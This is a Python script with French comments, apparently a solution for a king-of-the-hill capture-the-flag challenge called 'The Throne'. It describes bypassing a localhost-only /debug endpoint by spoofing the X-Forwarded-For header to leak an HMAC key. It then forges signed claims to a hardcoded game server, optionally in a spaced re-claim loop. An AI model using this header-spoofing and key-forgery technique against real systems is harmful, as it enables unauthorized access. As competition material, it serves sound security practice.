#!/usr/bin/env python3
"""
NCTF26 KOTH — The Throne : prise de la colline.

Solution prévue : /debug (accessible via X-Forwarded-For: 127.0.0.1) livre la
clé HMAC. On signe une réclamation valide avec NOTRE jeton d'équipe et on
l'envoie à POST /throne. C'est l'action légitime du jeu.

Usage :
    python3 throne_claim.py            # 1 prise immédiate
    python3 throne_claim.py --hold     # re-plante pour tenir (cadence raisonnable)

Règle du jeu : interdiction de flood/DoS. La boucle --hold est volontairement
espacée (défaut 20 s, bien dans la tolérance de 45 s), PAS un hammer. Ne baisse
pas l'intervalle au point d'en faire du stress réseau.
"""
import hmac, hashlib, time, sys, json, urllib.request

HOST     = "http://13.37.197.230:28490"
TEAM     = "242cb7b1d3645528"                               # jeton The Throne (secret)
HILL_KEY = "d2e775a9aa7633e140a43cb6998778e7c63f7abeb4e3f583"
INTERVAL = 20                                               # secondes entre deux re-prises en --hold

def _sig(team, ts, key):
    return hmac.new(key, f"{team}|{ts}".encode(), hashlib.sha1).hexdigest()

def claim():
    ts = int(time.time())
    # la clé peut être interprétée comme chaîne hex OU comme octets décodés : on teste les deux
    for label, key in (("key=str", HILL_KEY.encode()), ("key=bytes", bytes.fromhex(HILL_KEY))):
        body = json.dumps({"team": TEAM, "ts": ts, "sig": _sig(TEAM, ts, key)}).encode()
        req = urllib.request.Request(f"{HOST}/throne", data=body,
                                     headers={"Content-Type": "application/json"}, method="POST")
        try:
            with urllib.request.urlopen(req, timeout=5) as r:
                txt = r.read().decode(errors="replace")
                print(f"[{label}] {r.status} {txt[:200]}")
                if 200 <= r.status < 300:
                    return True
        except urllib.error.HTTPError as e:
            print(f"[{label}] {e.code} {e.read().decode(errors='replace')[:200]}")
        except Exception as e:
            print(f"[{label}] erreur réseau : {e}")
    return False

if __name__ == "__main__":
    hold = "--hold" in sys.argv
    if not hold:
        claim()
    else:
        print(f"[hold] re-prise toutes les {INTERVAL}s — Ctrl-C pour arrêter")
        while True:
            ok = claim()
            print("  -> trône tenu" if ok else "  -> échec, on réessaie")
            time.sleep(INTERVAL)
